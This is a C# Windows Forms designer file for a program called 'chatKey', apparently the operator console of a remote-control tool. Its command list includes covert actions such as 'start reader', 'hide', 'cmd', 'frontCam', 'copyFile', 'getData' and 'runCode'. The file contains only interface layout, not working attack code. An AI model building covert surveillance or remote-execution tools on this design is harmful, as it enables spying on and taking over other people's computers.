namespace chatKey
{
    partial class FormMain
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.buttonConect = new System.Windows.Forms.Button();
            this.textBoxBord = new System.Windows.Forms.RichTextBox();
            this.textBoxMesgeBody = new System.Windows.Forms.TextBox();
            this.buttonMasge = new System.Windows.Forms.Button();
            this.buttonRemove = new System.Windows.Forms.Button();
            this.textBoxIp = new System.Windows.Forms.ComboBox();
            this.textBoxMesgeName = new System.Windows.Forms.ComboBox();
            this.SuspendLayout();
            // 
            // buttonConect
            // 
            this.buttonConect.Location = new System.Drawing.Point(134, 7);
            this.buttonConect.Name = "buttonConect";
            this.buttonConect.Size = new System.Drawing.Size(126, 23);
            this.buttonConect.TabIndex = 2;
            this.buttonConect.Text = "conect to server";
            this.buttonConect.UseVisualStyleBackColor = true;
            this.buttonConect.Click += new System.EventHandler(this.buttonConect_Click);
            // 
            // textBoxBord
            // 
            this.textBoxBord.Location = new System.Drawing.Point(12, 36);
            this.textBoxBord.Name = "textBoxBord";
            this.textBoxBord.Size = new System.Drawing.Size(335, 155);
            this.textBoxBord.TabIndex = 3;
            this.textBoxBord.Text = "";
            this.textBoxBord.Click += new System.EventHandler(this.clearBord);
            // 
            // textBoxMesgeBody
            // 
            this.textBoxMesgeBody.Location = new System.Drawing.Point(13, 248);
            this.textBoxMesgeBody.Name = "textBoxMesgeBody";
            this.textBoxMesgeBody.Size = new System.Drawing.Size(334, 20);
            this.textBoxMesgeBody.TabIndex = 4;
            this.textBoxMesgeBody.Text = "body";
            // 
            // buttonMasge
            // 
            this.buttonMasge.Location = new System.Drawing.Point(137, 219);
            this.buttonMasge.Name = "buttonMasge";
            this.buttonMasge.Size = new System.Drawing.Size(210, 23);
            this.buttonMasge.TabIndex = 5;
            this.buttonMasge.Text = "send";
            this.buttonMasge.UseVisualStyleBackColor = true;
            this.buttonMasge.Click += new System.EventHandler(this.buttonMasge_Click);
            // 
            // buttonRemove
            // 
            this.buttonRemove.Location = new System.Drawing.Point(266, 7);
            this.buttonRemove.Name = "buttonRemove";
            this.buttonRemove.Size = new System.Drawing.Size(81, 23);
            this.buttonRemove.TabIndex = 8;
            this.buttonRemove.Text = "exit";
            this.buttonRemove.UseVisualStyleBackColor = true;
            this.buttonRemove.Click += new System.EventHandler(this.buttonRemove_Click);
            // 
            // textBoxIp
            // 
            this.textBoxIp.FormattingEnabled = true;
            this.textBoxIp.Location = new System.Drawing.Point(12, 7);
            this.textBoxIp.Name = "textBoxIp";
            this.textBoxIp.Size = new System.Drawing.Size(116, 21);
            this.textBoxIp.TabIndex = 9;
            this.textBoxIp.KeyDown += new System.Windows.Forms.KeyEventHandler(this.textBoxIp_KeyDown);
            // 
            // textBoxMesgeName
            // 
            this.textBoxMesgeName.FormattingEnabled = true;
            this.textBoxMesgeName.Items.AddRange(new object[] {
            "end",
            "start reader",
            "start img",
            "stop reader",
            "stop img",
            "clearBord",
            "mail",
            "look",
            "hide",
            "cmd",
            "frontCam",
            "getData",
            "getUrl",
            "copyFile",
            "say",
            "imgAll",
            "imgAll2",
            "imgAllFile",
            "setText",
            "setTextS",
            "volumeUp",
            "volumeDown",
            "volume",
            "beep",
            "setMouse",
            "beep1",
            "beep2",
            "beep3",
            "beepR",
            "runCode",
            "runCodeAll"});
            this.textBoxMesgeName.Location = new System.Drawing.Point(13, 219);
            this.textBoxMesgeName.Name = "textBoxMesgeName";
            this.textBoxMesgeName.Size = new System.Drawing.Size(121, 21);
            this.textBoxMesgeName.TabIndex = 10;
            this.textBoxMesgeName.KeyDown += new System.Windows.Forms.KeyEventHandler(this.textBoxMesgeName_KeyDown);
            // 
            // FormMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(351, 273);
            this.Controls.Add(this.textBoxMesgeName);
            this.Controls.Add(this.textBoxIp);
            this.Controls.Add(this.buttonRemove);
            this.Controls.Add(this.buttonMasge);
            this.Controls.Add(this.textBoxMesgeBody);
            this.Controls.Add(this.textBoxBord);
            this.Controls.Add(this.buttonConect);
            this.Name = "FormMain";
            this.Text = "chatKey";
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.Form1_FormClosed);
            this.Load += new System.EventHandler(this.FormMain_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Button buttonConect;
        private System.Windows.Forms.RichTextBox textBoxBord;
        private System.Windows.Forms.TextBox textBoxMesgeBody;
        private System.Windows.Forms.Button buttonMasge;
        private System.Windows.Forms.Button buttonRemove;
        private System.Windows.Forms.ComboBox textBoxIp;
        private System.Windows.Forms.ComboBox textBoxMesgeName;
    }
}

